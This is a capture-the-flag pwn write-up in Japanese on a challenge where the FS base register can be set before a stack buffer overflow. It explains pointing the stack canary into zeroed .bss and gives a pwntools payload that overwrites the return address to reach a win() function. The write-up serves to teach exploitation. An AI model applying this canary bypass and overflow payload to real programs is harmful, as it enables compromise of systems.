
# [fsbase modification] Writeup
日付: 2026-10-08  
カテゴリ: pwn

---

## 問題概要
問題文:
vuln関数にはスタックバッファオーバーフローの脆弱性があります。しかし戻りアドレスを改変してもstack canaryがあるため異常終了してしまいます。
ただ今回は、vuln関数が呼び出される前にfsbaseというものを設定できるようです



---

## 試行錯誤
1. vuln関数を呼び出す。
main関数ではfsbase(-1 for testing a default vuln behavior): の表示の後に改行を含めて32bit分入力が可能である。
その後に、fsbaseの更新処理が行われるが、この時

```c
unsigned long fsbase = strtoul(buf, NULL, 10);

int result = syscall(SYS_arch_prctl, ARCH_SET_FS, fsbase);
if (result < 0) {
    write(STDOUT_FILENO, "arch_prctl failed.\n", 19);
```
システムコールの結果が-1のとき、エラーが起こり、vuln関数が呼び出されない。
適当に1や11111111111111111111などの値を入力するとある一定の範囲ではvulnを呼び出すことに成功した。

2. vuln()からwin()への遷移を考える。
vuln関数には8バイトのchar型のメモリがあるが、その後の入力は24バイトの長さまで入力ができるため、BOFの脆弱性が存在する。

```c
void __attribute__((__used__)) win(void) {
    char *argv[] = {"/bin/cat", "/flag.txt", NULL};
    syscall(SYS_execve, argv[0], argv, NULL);
}


void vuln(void) {
    char buf[8] = {0};
    write(STDOUT_FILENO, "Please leave a message> ", 24);
    read(STDIN_FILENO, buf, 32);
    
```
vuln()のメモリには上位アドレスから`buf[8]` -> savedRBP(8バイト) -> returnアドレスが存在していると考えた。
win()関数のreturnアドレスをGhidraを使い調べ、書き換えるとflagが取得できると考えた。
実際にbufとsavedRBPを考慮して17バイト目からwin()のリターンアドレスを入力してみた。
すると以下のように**stack smashing detected: terminated**とメモリの保護機能により、プログラムが強制終了してしまった。

```
fsbase(-1 for testing a default vuln behavior): 111111111111111111111111
arch_prctl failed.
Please leave a message> 11111111111111110x004011b6
*** stack smashing detected ***: terminated
```
この時、fsbase、つまりCanaryが原因だと調べて理解した。

3. canaryの保護機能を回避する。
3.1 main関数のcanaryの処理を調べる
```
unsigned long fsbase = strtoul(buf, NULL, 10);
```
のコードではbufの値(10進数)を符号なしのlong型に変更している。
また、
```
int result = syscall(SYS_arch_prctl, ARCH_SET_FS, fsbase);
```
で、レジスタのアドレスの変更命令が行われており、fsbaseの値をレジスタに設定している。
ARCH_SET_FSコマンドによってFS（ベースレジスタ）の値を fsbase に書き換えることで、メンバ変数である stack_guard（fs:0x28）の参照先アドレスも移動する。一致していないと保護機能がプログラムを停止する。

また、canaryは関数呼び出し時にコピーされ、savedRBPの上にスタックされる。
3.2 エクスプロイトを考える。
方法としてはfsbaseの`stack_guard`の値を上書きして、canaryの値を任意の値にして、vuln()の入力時にcanaryの値と一致するように入力しながらBOFを起こす。
fsbaseの値は.bss領域のアドレス(0x4040a8)になるようにすり替えることで、canaryの値は全て0になる。
canaryの`stack_guard`のアドレスはFSから0x28後ろなので0x4040a8のアドレスに上書きするためには、0x404080をfsbaseの入力をする必要がある。
```
target_addr = 0x404080  # 設定したいアドレス
p.sendlineafter(b"fsbase", str(target_addr).encode())
```
vuln()関数でのメモリはcanaryにより、`buf[8]` -> canary(8バイト)-> savedRBP(8バイト) -> returnアドレスになる。
Canaryの参照先が .bss 領域（全ゼロ）に移動したため、
```
payload += b"A" * 8          # バッファ領域
payload += p64(0)            # 64ビット数値としての 0x0000000000000000
payload += b"B" * 8          # Saved RBP
payload += p64(0x004011b6)   # 64ビット数値としてのアドレス
```
buf(8バイト)+canary(8バイト分の0)+savedRBP(8バイト)=24バイトのため、25バイト目から遷移したいアドレスを設定するとwin()へと飛ぶことができた。
```
[*] You have the latest version of Pwntools (4.15.0)
[+] Opening connection to 34.170.146.252 on port 37571: Done
[*] Switching to interactive mode
Alpaca{DUMMY}
[*] Got EOF while reading in interactive
$ q
$ 
[*] Interrupted
[*] Closed connection to 34.170.146.252 port 37571
```
## まとめ
- canaryの値を自身で設定して、BOF時にcanaryと値が一致するようにBOFを起こすとcanaryの機能を回避できる。
- canaryは`stack_guard`に入っているので、.bssの値が全て0のアドレスを指すようにすることで、canaryの回避が楽になった。
- 変数の値、canary、saved RBPのサイズを考慮してreturnアドレスを書き換えると自由な関数に飛ぶことができ、flagが手に入った。

